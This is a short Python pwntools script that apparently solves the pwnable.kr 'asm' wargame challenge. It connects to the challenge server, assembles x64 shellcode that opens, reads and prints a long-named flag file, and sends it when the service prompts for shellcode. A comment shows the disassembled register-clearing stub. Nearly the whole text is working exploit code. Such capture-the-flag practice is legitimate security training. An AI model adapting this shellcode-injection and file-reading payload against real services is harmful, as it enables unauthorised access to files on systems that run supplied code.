from pwn import *
context(arch='amd64',os='linux')
n = remote('pwnable.kr',9026)

'''
stub
0x0000000000000000:  48 31 C0    xor rax, rax
0x0000000000000003:  48 31 DB    xor rbx, rbx
0x0000000000000006:  48 31 C9    xor rcx, rcx
0x0000000000000009:  48 31 D2    xor rdx, rdx
0x000000000000000c:  48 31 F6    xor rsi, rsi
0x000000000000000f:  48 31 FF    xor rdi, rdi
0x0000000000000012:  48 31 ED    xor rbp, rbp
0x0000000000000015:  4D 31 C0    xor r8, r8
0x0000000000000018:  4D 31 C9    xor r9, r9
0x000000000000001b:  4D 31 D2    xor r10, r10
0x000000000000001e:  4D 31 DB    xor r11, r11
0x0000000000000021:  4D 31 E4    xor r12, r12
0x0000000000000024:  4D 31 ED    xor r13, r13
0x0000000000000027:  4D 31 F6    xor r14, r14
0x000000000000002a:  4D 31 FF    xor r15, r15
'''

shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp',0,0)
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)

n.sendafter('give me your x64 shellcode: ',asm(shellcode))

print(n.recvline())

